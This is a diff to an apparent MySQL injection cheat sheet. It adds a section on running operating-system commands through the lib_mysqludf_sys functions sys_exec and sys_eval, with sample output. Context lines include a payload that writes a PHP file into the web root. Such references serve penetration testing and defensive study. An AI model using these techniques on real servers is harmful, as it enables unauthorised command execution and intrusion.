@@ -21,6 +21,7 @@
 * [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
 * [MYSQL Read content of a file](#mysql-read-content-of-a-file)
 * [MYSQL Write a shell](#mysql-write-a-shell)
+* [MYSQL UDF command execution](#mysql-udf-command-execution)
 * [MYSQL Truncation](#mysql-truncation)
 * [MYSQL Out of band](#mysql-out-of-band)
     * [DNS exfiltration](#dns-exfiltration)
@@ -249,6 +250,29 @@ SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo
 ## MYSQL Truncation
 
 In MYSQL "`admin `" and "`admin`" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.
+
+## MYSQL UDF command execution
+
+First you need to check if the UDF are installed on the server.
+
+```powershell
+$ whereis lib_mysqludf_sys.so
+/usr/lib/lib_mysqludf_sys.so
+```
+
+Then you can use functions such as `sys_exec` and `sys_eval`.
+
+```sql
+$ mysql -u root -p mysql
+Enter password: [...]
+mysql> SELECT sys_eval('id');
++--------------------------------------------------+
+| sys_eval('id') |
++--------------------------------------------------+
+| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
++--------------------------------------------------+
+```
+
 
 ## MYSQL Out of band
 
